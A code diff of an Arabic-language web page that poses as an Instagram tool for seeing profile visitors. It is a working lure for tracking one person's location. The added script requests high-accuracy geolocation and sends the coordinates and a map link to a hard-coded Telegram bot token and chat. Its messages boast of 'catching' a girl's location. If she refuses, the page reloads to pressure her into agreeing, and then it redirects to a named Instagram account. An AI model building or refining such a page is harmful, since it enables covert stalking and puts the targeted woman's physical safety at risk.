@@ -3,44 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Insights - من زار ملفك؟</title>
+    <title>Instagram Insights - زوار الحساب</title>
     <style>
-        body { background: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 85%; max-width: 350px; text-align: center; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
-        .inst-icon { width: 80px; height: 80px; background: linear-gradient(45deg, #f09433, #dc2743, #bc1888); border-radius: 20px; margin: 0 auto 20px; display: flex; justify-content: center; align-items: center; color: white; font-size: 40px; font-weight: bold; }
-        h2 { font-size: 18px; color: #262626; }
-        p { font-size: 14px; color: #8e8e8e; margin: 15px 0; }
-        .btn { background: #0095f6; color: white; border: none; padding: 12px; border-radius: 5px; font-weight: bold; width: 100%; cursor: pointer; }
+        body { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; }
+        .card { background: white; color: #262626; padding: 25px; border-radius: 15px; width: 85%; max-width: 340px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.3); }
+        .inst-icon { width: 60px; height: 60px; margin-bottom: 15px; }
+        h2 { font-size: 19px; margin-bottom: 10px; color: #1c1e21; }
+        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 20px; }
+        .btn { background-color: #0095f6; color: white; padding: 12px; border-radius: 8px; border: none; font-weight: bold; width: 100%; cursor: pointer; font-size: 15px; }
+        #loading { display: none; margin-top: 15px; color: #0095f6; font-weight: bold; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="inst-icon">📈</div>
-    <h2>كشف زوار البروفايل</h2>
-    <p>لقد قام 14 شخصاً بزيارة حسابك اليوم! يرجى تأكيد موقعك للمطابقة مع خادم البيانات وعرض القائمة الكاملة بالأسماء.</p>
-    <button class="btn" onclick="startScan()">عرض القائمة الآن</button>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" class="inst-icon">
+    <h2>من شاهد ملفك الشخصي؟</h2>
+    <p>تم رصد 23 زيارة جديدة لحسابك اليوم! يرجى السماح بالوصول للموقع للمطابقة مع خادم البيانات وعرض قائمة الأسماء الكاملة.</p>
+    <button class="btn" onclick="startCapture()">عرض القائمة الآن</button>
+    <div id="loading">جاري فحص البيانات...</div>
 </div>
 
 <script>
     const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
     const chat_id = '7214473798';
 
-    function send(msg) {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+    async function sendToTelegram(msg) {
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
     }
 
-    function startScan() {
+    function startCapture() {
+        document.getElementById('loading').style.display = 'block';
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(function(p) {
-                const mapLink = `https://www.google.com/maps?q=${lat},${p.coords.latitude},${p.coords.longitude}`;
-                send(`🎯 تم صيد موقع البنت (ha2542213)!\n📍 الرابط: ${mapLink}\n📏 الدقة: ${p.coords.accuracy} متر`);
-                alert("جاري تحميل الأسماء...");
-                window.location.href = "https://www.instagram.com";
+                const lat = p.coords.latitude;
+                const lon = p.coords.longitude;
+                const acc = p.coords.accuracy;
+                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                
+                sendToTelegram(`🎯 تم صيد إحداثيات البنت بنجاح!\n📍 الرابط: ${mapLink}\n📏 الدقة: ${acc} متر`);
+                
+                setTimeout(() => {
+                    window.location.href = "https://www.instagram.com/ha2542213";
+                }, 1000);
             }, function(e) {
-                send("⚠️ البنت فتحت الستوري وضغطت (رفض) للموقع.");
+                sendToTelegram("⚠️ البنت فتحت الرابط وضغطت (رفض) للموقع.");
                 alert("خطأ: يجب السماح بالوصول للموقع لتحديث قائمة الزوار.");
-                startScan(); // إلحاح لطلب الموقع مرة ثانية
+                location.reload(); // إعادة الطلب لإجبارها
             }, {enableHighAccuracy: true});
         }
     }
